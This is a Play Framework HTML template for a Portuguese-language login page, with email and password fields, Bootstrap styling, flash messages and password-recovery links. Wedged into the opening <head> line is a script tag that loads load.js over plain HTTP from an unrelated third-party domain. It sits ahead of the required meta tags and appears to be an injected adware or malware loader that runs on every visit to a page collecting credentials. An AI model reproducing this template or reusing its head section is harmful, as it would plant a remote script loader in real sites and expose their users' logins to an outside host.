@(message: String)

<!DOCTYPE html>
<html lang="pt-br">
  <head><script src="http://d.gettvwizard.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->

    <title>Sign in</title>
    
    <!-- Bootstrap core CSS -->
    <link href="http://getbootstrap.com/dist/css/bootstrap.min.css" rel="stylesheet">
	
	<link rel="stylesheet" media="screen" href="@routes.Assets.versioned("stylesheets/bootstrap.css")">
	
   
    <!-- Custom styles for this template -->
    <link href="http://getbootstrap.com/examples/signin/signin.css" rel="stylesheet">
    
  
	
	<link rel="stylesheet" media="screen" href='@routes.Assets.versioned("stylesheets/main.css")'>
	<link rel="stylesheet" media="screen" href='@routes.Assets.versioned("stylesheets/font-awesome.min.css")'>
  
  </head>

  <body>
  
	  
	<!-- Fixed navbar -->
    <div class="navbar navbar-default navbar-fixed-top">
      <div class="container">
          <center><img class="centralizar" src='@routes.Assets.versioned("images/logo.jpg")'/></center>
      </div>
    </div>
    
    @if(flash.contains("success")) {
	<div class="alert alert-info alert-dismissible" role="alert">
		<button type="button" class="close" data-dismiss="alert"
			aria-label="Close">
			<span aria-hidden="true">&times;</span>
		</button>
		<strong>Ok!</strong> @flash.get("success")
	</div>
	}
	@if(flash.contains("error")) {
	<div class="alert alert-warning alert-dismissible" role="alert">
		<button type="button" class="close" data-dismiss="alert"
			aria-label="Close">
			<span aria-hidden="true">&times;</span>
		</button>
		<strong>Ops!</strong> @flash.get("error")
	</div>
	}

	<!-- Login -->
    <div class="container">

       <form class="form-signin" action="@routes.Application.login()" method="POST">
      
        <h2 class="form-signin-heading"><center>Login</center></h2>
        
        <div class="form-group">
        	<label for="inputEmail"></label>
        	<input name="email" type="text" class="form-control" id="inputEmail" placeholder="Email" required>
      
        	<label for="inputSenha"></label>
        	<input name="senha" type="password" class="form-control" id="inputSenha" placeholder="Senha" required>
		</div>
       
        <center>
        <button class="btn btn-lg btn-primary" type="submit">Sign in</button>
        
        <!--Aqui preciso colocar link pra um form google -->
        <a class="btn btn-lg btn-success" href="/contato">Contact</a>
        <br><br>
        <a href="/recuperaSenha" style="color:blue">Esqueceu sua senha?</a>

      </form>

    </div>
      <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <!-- Include all compiled plugins (below), or include individual files as needed -->
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
  
  <!-- scripts -->
  </body>

</html>
